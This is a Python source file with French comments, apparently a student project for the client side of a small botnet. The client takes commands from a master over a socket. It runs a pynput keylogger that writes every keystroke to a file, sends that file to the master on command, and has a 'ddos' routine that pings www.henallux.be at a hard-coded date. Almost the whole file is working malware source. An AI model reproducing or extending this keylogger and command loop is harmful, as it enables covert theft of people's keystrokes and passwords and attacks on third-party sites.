#importation du module socket afin de permetttre une communication réseau
import socket as modSocket
from pynput.keyboard import Key, Listener
import logging
import threading
import time
from datetime import datetime
from pythonping import ping

lock = threading.Lock()

"""
création de l'objet communication
avec le champ data, qui va contenir le message envoyé par le maitre.
il y a plusieurs champs qui vont être des actions a effectuer.
start_log() va lancer un logger qui va enregistrer tous ce qui vas être taper
sur le clavier.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Une fois que le code rentre dans le start_log(), il ne s'y retire plus, on rentre dans une
sorte de boucle infini, on est obligé de stopper de force le programme pour y sortir. Et ont veut que
le programme ne s'éteigne jamais, et puisse recommencer à communiquer avec le maitre.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
ddos() ..................
send_log() ..............
fais ce qui te plais avec les 2 methodes au dessus a toi de t'amuser :D
"""

class Connexion():
    # création de l'objet connexion avec le champ adresseMachine
    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn, donnee):
        self.adresseMachine = adresseMachine
        self.carteReseauEcoute = carteReseauEcoute
        self.carteReseauConn = carteReseauConn
        self.donnee = donnee


    #1er étape, mettre en place un canal de communication pour recevoir les messages du master
    def listen(self, carteReseauEcoute, donnee):
        # écoute sur toutes l'adresse du slave et sur le port 60 000
        adresseMachineMaitre = (("localhost", 60000))
        carteReseauEcoute.bind(adresseMachineMaitre)
        # une fois connecté, on le met en écoute et on accepte la connexion afin qu'il reçoive les instruction du master
        
        print("J'écoute")
        carteReseauEcoute.listen(5)
        connReseau, addr = carteReseauEcoute.accept()
        print("Connecté avec la machine : ", addr)
        #boucle qui permet de lancer une methode de l'objet communication
        try:
            while donnee != "FIN":
                if donnee == "keylogger":
                    print("OK je lance le keylogger")
                    #lance la methode start_log de l'objet Communication
                    a.start_log(connReseau, donnee)
                elif donnee == "transfert":
                    print("J'envoie le keylogger")
                    a.get_log(connReseau, donnee)
                elif donnee == "ddos":
                    print("on lance le ddos")
                    a.ddos()
                donnee = connReseau.recv(1024).decode("utf-8")
        except ConnectionResetError:
            print("Connexion arreté par le maitre")
            a.reEcoute(carteReseauEcoute)
        a.reEcoute(carteReseauEcoute)
        
    def reEcoute(self, carteReseauEcoute):
        print("Fini je re-écoute")
        carteReseauEcoute.close()
        carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
        a.listen(carteReseauEcoute, donnee)

        

    # 2è étape, mettre en place un canal de communication pour envoyer des messages au master
    def sendIP(self, carteReseauConn, adresseMachine):
        try:
            # on définit les coordonnées sur lesquelles le slave va envoyer son adresse ip
            carteReseauConn.connect(adresseMachine)
            carteReseauConn.send(b"Je me connecte")
            print("IP envoyée au master")
            a.listen(carteReseauEcoute, donnee)
        except ConnectionRefusedError:
            print("Machine maitre non connecté")
        


class Action(Connexion):

    def __init__(self, donnee):
        self.donnee = donnee

    def start_log(self, connReseau, donnee):
        try:
            #chemin ou seront écris les logs voulus
            log_dir = r"D:"
            #met les informations de base concernant le logger
            #filename, spécifie le nom du fichier
            #format, impose les infos de base qui se trouveront dans le logger, içi la date avec l'heure puis les infos sur les entrées sur le clavier 
            logging.basicConfig(filename = (log_dir + "\\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
            #Création d'une fonction appuie(), qui vas mettre en string touts les appuie sur le clavier
            def appuie(key):
                logging.info(str(key))

            #une fois rentrer içi le programme écoute les appuie sur les entrées
            with Listener(on_press=appuie) as listener:
                connReseau.send(b"Logger actif")
                #cette condition nous permet d'arreter le logger
                if connReseau.recv(1024).decode("utf-8") != "stop":
                    listener.join()
                connReseau.send(b"Logger inactif")
                print("Logger arretée")
        except FileNotFoundError:
            print("erreur chemin inexistant")
    
    def get_log(self, connReseau, donnee):
        logger = open("D:\\keyLog.txt", "r")
        fichier = logger.read()
        connReseau.send(fichier.encode("utf-8"))

    def ddos(self):
        #définir le format de la date quand on la rentrera dans la variable
        format = "%Y-%m-%d %H:%M"
        #on récupère la date et l'heure actuelle et on la formate comme voulu ci dessus
        now = datetime.strftime(datetime.now(), format)
        #on compare la date et l'heure récupérées à celle souhaitée pour le ddos
        if (now == "2019-12-04 22:24"):
            #on envoie la requête, verbose permet d'afficher le ping, size gère sa taille et count le nombre de paquets
            ping ('www.henallux.be', verbose=True, size=400, count=15)
            print("ping okay")
        else:
            print("error")




adresseMachine = ("localhost", 60000)
carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
donnee = ""
a = Action(donnee)


a.sendIP(carteReseauConn, adresseMachine)




    






"""
Dernier problème que je ne comprend pas dans notre programme.
Il reçoit les réponse du maitre dans l'ordre (data = conn.recv(1024).decode("utf-8"))
par exemple si dans le maitre après avoir prit le choix pour lancer le keylogger, on ne choisi pas après
celui pour l'arreter on ne pourra plus arreter le programme par après.
car il y a un ordre qui ces créer dans les data.
:(
"""
    


